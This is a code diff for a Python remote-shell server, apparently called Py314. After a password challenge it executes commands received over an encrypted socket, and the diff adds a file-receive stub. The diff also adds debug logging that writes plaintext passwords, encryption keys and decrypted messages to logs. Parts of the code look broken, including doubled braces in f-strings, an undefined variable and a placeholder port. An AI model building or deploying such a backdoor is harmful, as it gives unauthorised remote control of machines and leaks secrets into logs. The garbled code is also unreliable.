@@ -27,6 +27,9 @@ def generate_key(password):
     digest.update(password.encode())
     key = base64.urlsafe_b64encode(digest.finalize())
 
+    logging.debug(f"Password for key generation : {{password}}")
+    logging.debug(f"Generated key : {{key}}")
+
     return key
 
 def encrypt_file(password, infile, outfile):
@@ -48,6 +51,7 @@ def encrypt_file(password, infile, outfile):
         logging.warning(error)
 
 
+
 def encrypt_message(password, message):
     """Encrypt a message with str type and return message as str encrypted"""
     
@@ -55,6 +59,9 @@ def encrypt_message(password, message):
 
     message = message.encode()
     encrypted = fernet.encrypt(message)
+
+    logging.debug(f"Message before encryption : {{message}}")
+    logging.debug(f"Message after encryption : {{encrypted.decode()}}")
 
     return encrypted.decode()
     
@@ -85,6 +92,9 @@ def decrypt_message(password, message):
     message = message.encode()
     decrypted = fernet.decrypt(message)
 
+    logging.debug(f"Message before decryption : {{message}}")
+    logging.debug(f"Message after decryption : {{decrypted.decode()}}")
+
     return decrypted.decode()
 
 
@@ -103,19 +113,48 @@ def passwordChallenge(channel, passwd):
 
     # Decode bytes to str
     hashPassword = rawHashPassword.decode()
+
+    logging.debug(f"Password used for password channel : {{password}}")
+    logging.debug(f"Generated SHA512 : {{ciperPassword}}")
+    logging.debug(f"Received SHA512 : {{hashPassword}}")
     
     if hashPassword == ciperPassword:
+        logging.debug('Successfull password challenge')
         response = hashlib.sha512(ciperPassword.encode()).hexdigest()
         channel.sendall(response.encode())
         challenge = True
     
     elif hashPassword != ciperPassword:
+        logging.debug('Password challenge failed')
         response = b' '
         channel.sendall(response)
         channel.close()
         challenge = False
 
     return challenge, hashPassword
+
+
+def receiveFile(channel, password, request):
+    
+    src = request.split(' ')[1]
+    srcBasename = os.path.basename(src)
+    dst = request.split(' ')[2]
+
+    logging.debug(f"Channel : {{channel}}")
+    logging.debug(f"Password : {{password}}")
+    logging.debug(f"Request : {{request.split(' ')[0]}}")
+    logging.debug(f"Wanted filename : {{srcBasename}}")
+    logging.debug(f"Destination folder : {{dst}}")
+
+    if not os.path.isdir(dst):
+        answer = '!'
+    elif os.path.isdir(dst):
+        answer = 'ready'
+
+    encryptedAnswer = encrypt_message(password, answer)
+    channel.sendall(encryptedAnswer.encode())
+
+
 
 
 def serverHandler(channel, password):
@@ -140,51 +179,53 @@ def serverHandler(channel, password):
             # Decode bytes to str
             clientRequestEncrypted = rawRequest.decode()
             clientRequest = decrypt_message(password, clientRequestEncrypted)
-            logging.debug(f"RECV ENCRYPTED : {{clientRequestEncrypted}}")
-            logging.debug(f"RECV DECRYPTED : {{clientRequest}}")
     
 # ------------------------------- Py314 REQUEST PARSING -------------------------------
 
             # If 'cd' command send
-
-            
             if clientRequest.split(' ')[0] == 'cd':
-                if len(clientRequest.split(' ')) > 1:
-                    workingDir = clientRequest.split(' ')[1]
-                    if os.path.isdir(workingDir):
-                        os.chdir(workingDir)
-                        # Return empty output, to not block the remote shell
-                        output = ' '
-                    else:
-                        output = f"{{workingDir}} doesn'nt exist"
+                workingDir = clientRequest.split(' ')[1]
+                logging.debug('Cd command send by Py314')
+                logging.debug(f'Want to move to {{workingDir}}')
+                if os.path.isdir(workingDir):
+                    os.chdir(workingDir)
+                    # Return empty output, to not block the remote shell
+                    output = ' '
                 else:
-                    output = f"Incomplete cd command"
+                    output = f"{{workingDir}} doesn'nt exist"
+
+                encryptedOutput = encrypt_message(password, output)
+                channel.sendall(encryptedOutput.encode())
 
             # If check alive
             elif clientRequest == 'alive ?':
+                logging.debug('Alive checking from Py314')
                 output  = "alive !"
+                logging.debug('Sending alive')
+
+                encryptedOutput = encrypt_message(password, output)
+                channel.sendall(encryptedOutput.encode())
+
+            # Elif client want to send a file
+            elif clientRequest.split(' ')[0] == 'send':
+                receiveFile(channel, password, clientRequest)
             
             # Else execute shell command
             else:
                 workingDir = os.getcwd()
                 output = shellCommand(clientRequest, workingDir)
-            
-# ---------------------------- SEND TO Py314 ----------------------------
 
-            logging.debug(f"SEND RAW : \\n{{output}}")
-            logging.debug(f"SEND ENCRYPT : \\n{{encrypt_message(password, output)}}")
-            encryptedOutput = encrypt_message(password, output)
-            channel.sendall(encryptedOutput.encode())
-
+                encryptedOutput = encrypt_message(password, output)
+                channel.sendall(encryptedOutput.encode())
 
 
         except KeyboardInterrupt:
             channel.close()
             exit()
 
-        #except Exception as error:
-        #    logging.warning(f"{{error}}")
-        #    exit()
+        except Exception as error:
+            logging.warning(f"{{error}}")
+            exit()
 
     
 
@@ -234,12 +275,12 @@ if len(sys.argv) > 1:
     verbose = sys.argv[1]
     if verbose == '-v':
         level = logging.INFO
+        logFormat = '[%(asctime)s]-[%(levelname)s] : %(message)s'
     elif verbose == '-vv':
         level = logging.DEBUG
-else:
-    level = logging.CRITICAL
+        logFormat = '[%(asctime)s]-[%(levelname)s] (from %(funcName)s in %(module)s) : %%(message)s'
 
-logging.basicConfig(level=level, format='[%(asctime)s]-[%(levelname)s] : %(message)s', datefmt='%H:%M:%S')
+    logging.basicConfig(level=level, format=logFormat, datefmt='%H:%M:%S')
 
 
 bindPort = {}
@@ -254,6 +295,7 @@ serverSocket.bind((bindAddress, bindPort))
 serverSocket.listen(5)
 
 logging.info(f"Listening on {{bindAddress}}:{{bindPort}}")
+#print(f"[?] Listening on {{bindAddress}}:{{bindPort}}")
 
 while True:
 
@@ -263,16 +305,9 @@ while True:
         logging.info(f"Received Connection from {{cliAddress[0]}}")
         challenge, receivedHash = passwordChallenge(channel, password)
         if challenge is True:
-            logging.debug(f'Successfull password challenge with : ')
-            logging.debug(f'SHA512 excepted > {{ciperPassword}}')
-            logging.debug(f'SHA512 received > {{receivedHash}}')
             serverHandler(channel, password)
         elif challenge is False:
-            logging.debug(f'Password challenge failed with :')
-            logging.debug(f'Password > {{password}}')
-            logging.debug(f'SHA512 excepted > {{ciperPassword}}')
-            logging.debug(f'SHA512 received > {{receivedHash}}')
-
+            logging.debug(f"Closing channel {{channel}}")
             channel.close()
 
 
@@ -282,7 +317,7 @@ while True:
         
         
     except Exception as error:
-        #logging.warning(f"{{error}}")
+        logging.warning(f"{{error}}")
         serverSocket.close()
         exit()
 
